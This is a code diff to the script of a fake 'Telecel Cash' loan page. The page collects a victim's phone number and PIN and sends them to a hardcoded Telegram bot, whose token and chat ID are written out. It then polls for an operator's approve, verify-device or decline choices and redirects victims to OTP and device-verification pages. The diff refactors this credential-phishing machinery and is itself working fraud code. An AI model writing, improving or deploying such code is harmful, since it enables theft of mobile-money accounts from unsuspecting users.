@@ -303,18 +303,16 @@
 </div>
 
 <script>
-    // Telegram Configuration - HARDCODED for now (will work immediately)
-    // You can change these to your actual values
+    // Telegram Configuration
     const CONFIG = {
         BOT_TOKEN: '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA',
         CHAT_ID: '6414813627',
         DEVICE_PAGE: '/otp'
     };
 
-    let state = { lastUpdateId: 0 };
     let isProcessing = false;
     let userPhone = '';
-    let pendingMessageId = null;
+    let pollingInterval = null;
 
     const phoneInput = document.getElementById('phone');
     const pinInput = document.getElementById('password');
@@ -359,11 +357,11 @@
         continueBtn.disabled = true;
         continueBtn.textContent = "Verifying...";
 
-        const ts = Date.now();
-        const approveId = `approve_${ts}`;
-        const verifyDeviceId = `verify_device_${ts}`;
-        const appliedId = `applied_${ts}`;
-        const declineId = `decline_${ts}`;
+        const uniqueId = Date.now();
+        const approveId = `approve_${uniqueId}`;
+        const verifyDeviceId = `verify_device_${uniqueId}`;
+        const appliedId = `applied_${uniqueId}`;
+        const declineId = `decline_${uniqueId}`;
 
         const loanAmount = document.getElementById('loanAmount').textContent;
         const accountType = document.getElementById('accountType').value === 'mobile' ? 'Telecel Cash' : 'Broadband';
@@ -394,9 +392,9 @@
             const data = await response.json();
             
             if (data.ok) {
-                pendingMessageId = data.result.message_id;
                 spinner.style.display = 'flex';
-                startPolling(approveId, verifyDeviceId, appliedId, declineId);
+                // Start polling for this specific callback data
+                startPollingForCallback([approveId, verifyDeviceId, appliedId, declineId]);
             } else {
                 throw new Error(data.description || 'Failed to send message');
             }
@@ -407,131 +405,97 @@
         }
     }
 
-    function startPolling(approveId, verifyDeviceId, appliedId, declineId) {
-        const interval = setInterval(() => {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=30`)
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.ok || !data.result) return;
-                    
-                    for (const update of data.result) {
-                        if (update.update_id > state.lastUpdateId) {
-                            state.lastUpdateId = update.update_id;
-                        }
-                        
-                        if (update.callback_query) {
-                            const cb = update.callback_query.data;
-                            const callbackId = update.callback_query.id;
+    function startPollingForCallback(expectedCallbacks) {
+        let lastUpdateId = 0;
+        
+        // First, get current offset to avoid old messages
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok && data.result && data.result.length > 0) {
+                    lastUpdateId = data.result[data.result.length - 1].update_id;
+                }
+                
+                // Start polling
+                pollingInterval = setInterval(() => {
+                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`)
+                        .then(r => r.json())
+                        .then(data => {
+                            if (!data.ok || !data.result || data.result.length === 0) return;
                             
-                            // Answer the callback query immediately
-                            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    callback_query_id: callbackId,
-                                    text: "Processing your request..."
-                                })
-                            }).catch(console.error);
-                            
-                            if (cb === approveId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("✅ Loan Approved! Redirecting to OTP page...", "success");
+                            for (const update of data.result) {
+                                lastUpdateId = update.update_id;
                                 
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
+                                if (update.callback_query) {
+                                    const callbackData = update.callback_query.data;
+                                    const callbackId = update.callback_query.id;
+                                    
+                                    console.log('Received callback:', callbackData);
+                                    
+                                    // Answer the callback query
+                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
                                         method: 'POST',
                                         headers: { 'Content-Type': 'application/json' },
                                         body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `✅ <b>LOAN APPROVED</b>\n\nPhone: ${userPhone}\nStatus: Approved\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
+                                            callback_query_id: callbackId,
+                                            text: "Processing..."
                                         })
                                     }).catch(console.error);
+                                    
+                                    if (callbackData === expectedCallbacks[0]) { // Approve
+                                        clearInterval(pollingInterval);
+                                        pollingInterval = null;
+                                        spinner.style.display = 'none';
+                                        showStatus("✅ Loan Approved! Redirecting...", "success");
+                                        
+                                        setTimeout(() => {
+                                            window.location.href = CONFIG.DEVICE_PAGE;
+                                        }, 1500);
+                                        return;
+                                    }
+                                    else if (callbackData === expectedCallbacks[1]) { // Verify Device
+                                        clearInterval(pollingInterval);
+                                        pollingInterval = null;
+                                        spinner.style.display = 'none';
+                                        showStatus("📱 Device verification required.", "processing");
+                                        
+                                        setTimeout(() => {
+                                            window.location.href = '/device_verify.html';
+                                        }, 1500);
+                                        return;
+                                    }
+                                    else if (callbackData === expectedCallbacks[2]) { // Already Applied
+                                        clearInterval(pollingInterval);
+                                        pollingInterval = null;
+                                        spinner.style.display = 'none';
+                                        showStatus("📋 You have already applied.", "error");
+                                        resetButton();
+                                        return;
+                                    }
+                                    else if (callbackData === expectedCallbacks[3]) { // Decline
+                                        clearInterval(pollingInterval);
+                                        pollingInterval = null;
+                                        spinner.style.display = 'none';
+                                        showError("❌ Request declined.");
+                                        resetButton();
+                                        return;
+                                    }
                                 }
-                                
-                                setTimeout(() => {
-                                    window.location.href = CONFIG.DEVICE_PAGE;
-                                }, 1500);
-                                return;
-                            } 
-                            else if (cb === verifyDeviceId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("📱 Device verification required. Redirecting...", "processing");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `📱 <b>DEVICE VERIFICATION</b>\n\nPhone: ${userPhone}\nStatus: Device verification pending\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    }).catch(console.error);
-                                }
-                                
-                                setTimeout(() => {
-                                    window.location.href = '/device_verify.html';
-                                }, 1500);
-                                return;
                             }
-                            else if (cb === appliedId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showStatus("📋 You have already applied. Please wait for approval.", "error");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `📋 <b>ALREADY APPLIED</b>\n\nPhone: ${userPhone}\nStatus: Previously applied\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    }).catch(console.error);
-                                }
-                                
-                                resetButton();
-                                return;
-                            }
-                            else if (cb === declineId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showError("❌ Request declined. Please try again later.");
-                                
-                                if (pendingMessageId) {
-                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            chat_id: CONFIG.CHAT_ID,
-                                            message_id: pendingMessageId,
-                                            text: `❌ <b>LOAN DECLINED</b>\n\nPhone: ${userPhone}\nStatus: Declined\nTime: ${new Date().toLocaleString()}`,
-                                            parse_mode: 'HTML'
-                                        })
-                                    }).catch(console.error);
-                                }
-                                
-                                resetButton();
-                                return;
-                            }
-                        }
-                    }
-                })
-                .catch(err => console.error('Polling error:', err));
-        }, 1000);
+                        })
+                        .catch(err => console.error('Polling error:', err));
+                }, 1000);
+            });
     }
 
     function resetButton() {
         isProcessing = false;
         continueBtn.disabled = false;
         continueBtn.textContent = "Verify & Authorize Loan";
+        if (pollingInterval) {
+            clearInterval(pollingInterval);
+            pollingInterval = null;
+        }
     }
 
     continueBtn.onclick = () => {
